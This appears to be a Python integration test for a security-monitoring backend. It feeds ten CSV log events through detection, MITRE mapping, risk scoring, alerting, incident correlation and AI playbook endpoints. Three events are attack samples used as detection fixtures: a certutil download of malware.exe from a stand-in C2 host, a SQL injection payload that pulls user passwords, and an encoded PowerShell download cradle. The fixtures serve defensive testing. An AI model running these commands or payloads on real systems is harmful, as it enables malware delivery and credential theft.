"""
Deterministic End-to-End Pipeline Verification Test (Requirement 29):
10 Telemetry Events -> Exactly 3 Sigma Matches -> 3 Detections -> 
3 MITRE Mappings -> 3 Risk Assessments -> 3 Alerts -> Correlated Incident -> Incident AI Playbook.
"""

import io
import unittest
import uuid
from fastapi.testclient import TestClient
from app.main import app


class TestDeterministicPipeline(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)

    def test_10_events_to_3_detections_pipeline(self):
        # 1. Register & Authenticate unique analyst
        uid = uuid.uuid4().hex[:6]
        username = f"analyst_det_{uid}"
        email = f"det_{uid}@asoc.io"
        password = "SecurePassword123!"

        reg_res = self.client.post(
            "/api/v1/auth/register",
            json={
                "username": username,
                "email": email,
                "password": password,
                "first_name": "Deterministic",
                "last_name": "Analyst",
                "role": "analyst",
            },
        )
        self.assertEqual(reg_res.status_code, 201)

        login_res = self.client.post(
            "/api/v1/auth/login",
            data={"username": username, "password": password},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        self.assertEqual(login_res.status_code, 200)
        token = login_res.json()["access_token"]
        headers = {"Authorization": f"Bearer {token}"}

        # 2. Construct exactly 10 telemetry events: 3 matches and 7 benign
        csv_lines = [
            "timestamp,hostname,username,source_ip,destination_ip,destination_port,event_type,action,message",
            # MATCH 1: LOLBin abuse (matches suspicious_command_execution.yml)
            "2026-09-09T10:00:01Z,WIN-SRV-01,Administrator,10.0.1.10,198.51.100.22,443,cmd_exec,allowed,cmd.exe /c certutil.exe -urlcache -split -f http://c2.org/malware.exe %TEMP%\\malware.exe",
            # MATCH 2: SQL Injection (matches sql_injection_payload.yml)
            "2026-09-09T10:00:02Z,WEB-PROD-01,www-data,203.0.113.50,10.0.2.15,80,http_request,allowed,POST /search.php query=\' UNION SELECT id, username, password FROM users--",
            # MATCH 3: Obfuscated PowerShell (matches powershell_abuse.yml)
            "2026-09-09T10:00:03Z,WIN-SRV-01,SYSTEM,10.0.1.10,198.51.100.22,443,ps_exec,allowed,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
            # BENIGN 1
            "2026-09-09T10:00:04Z,WIN-SRV-01,john_doe,10.0.1.55,10.0.1.1,53,dns_query,allowed,Standard DNS query for corp.internal",
            # BENIGN 2
            "2026-09-09T10:00:05Z,WEB-PROD-01,guest,192.168.1.100,10.0.2.15,443,http_request,allowed,GET /assets/logo.png HTTP/1.1 200 OK",
            # BENIGN 3
            "2026-09-09T10:00:06Z,LINUX-APP-01,deploy,10.0.3.12,10.0.3.1,22,ssh_session,allowed,Authorized deployment key accepted for user deploy",
            # BENIGN 4
            "2026-09-09T10:00:07Z,PRINT-SRV-01,alice,10.0.1.80,10.0.4.10,9100,spooler_job,allowed,Document quarterly_report.pdf printed successfully",
            # BENIGN 5
            "2026-09-09T10:00:08Z,NTP-GW-01,ntp_daemon,10.0.0.1,17.253.34.253,123,ntp_sync,allowed,Clock offset adjusted by +0.0012s",
            # BENIGN 6
            "2026-09-09T10:00:09Z,WIN-SRV-01,health_bot,127.0.0.1,127.0.0.1,8080,health_check,allowed,Service health endpoint status 200 healthy",
            # BENIGN 7
            "2026-09-09T10:00:10Z,BACKUP-01,backup_agent,10.0.5.2,10.0.5.100,445,smb_transfer,allowed,Nightly incremental snapshot synced 420MB",
        ]
        csv_payload = "\n".join(csv_lines).encode("utf-8")

        # 3. Upload Telemetry
        upload_res = self.client.post(
            "/api/v1/logs/upload",
            files={"file": (f"deterministic_10_{uid}.csv", io.BytesIO(csv_payload), "text/csv")},
            data={"log_source": "endpoint"},
            headers=headers,
        )
        self.assertEqual(upload_res.status_code, 201)
        log_id = upload_res.json()["data"]["id"]

        # 4. Parse Log -> Verify exactly 10 parsed events
        parse_res = self.client.post(f"/api/v1/logs/{log_id}/parse", headers=headers)
        self.assertEqual(parse_res.status_code, 200)
        self.assertEqual(parse_res.json()["data"]["entries_created"], 10)

        # 5. Run Detection specifically on this file -> Verify exactly 3 detections
        det_run = self.client.post(f"/api/v1/detections/run-file/{log_id}", headers=headers)
        self.assertEqual(det_run.status_code, 200)
        summary = det_run.json()["data"]
        self.assertEqual(summary["events_scanned"], 10)
        self.assertEqual(summary["detections_created"], 3)

        # 6. Verify MITRE Technique Mappings for these detections
        file_dets = self.client.get(f"/api/v1/detections?security_log_id={log_id}&limit=10", headers=headers)
        self.assertEqual(file_dets.status_code, 200)
        dets = file_dets.json()["data"]
        self.assertEqual(len(dets), 3)

        for d in dets:
            mitre_res = self.client.get(f"/api/v1/detections/{d['id']}/mitre", headers=headers)
            self.assertEqual(mitre_res.status_code, 200)
            self.assertTrue(mitre_res.json()["success"])

        # 7. Risk Assessment -> Assess the 3 detections
        for d in dets:
            risk_res = self.client.post(f"/api/v1/risk/assess/{d['id']}", headers=headers)
            self.assertEqual(risk_res.status_code, 200)
            score = risk_res.json()["data"]["risk_score"]
            self.assertGreater(score, 0)

        # 8. Alert Generation -> Auto-generate alerts from risk assessments
        alert_gen_res = self.client.post("/api/v1/alerts/auto-generate", headers=headers)
        self.assertEqual(alert_gen_res.status_code, 200)
        self.assertGreaterEqual(alert_gen_res.json()["data"]["alerts_created"], 3)

        # 9. Incident Correlation -> Consolidate into incident
        inc_res = self.client.post("/api/v1/incidents/auto-correlate", headers=headers)
        self.assertEqual(inc_res.status_code, 200)
        self.assertGreaterEqual(inc_res.json()["data"]["incidents_created"], 1)

        # 10. Fetch incident and verify incident AI playbook
        latest_inc = self.client.get("/api/v1/incidents?limit=1", headers=headers)
        self.assertEqual(latest_inc.status_code, 200)
        inc_data = latest_inc.json()["data"][0]
        inc_id = inc_data["id"]

        ai_inc = self.client.post(f"/api/v1/ai/analyze/incident/{inc_id}", headers=headers)
        self.assertEqual(ai_inc.status_code, 200)
        self.assertIn("recommended_actions", ai_inc.json()["data"])
        self.assertGreater(len(ai_inc.json()["data"]["recommended_actions"]), 0)


if __name__ == "__main__":
    unittest.main()
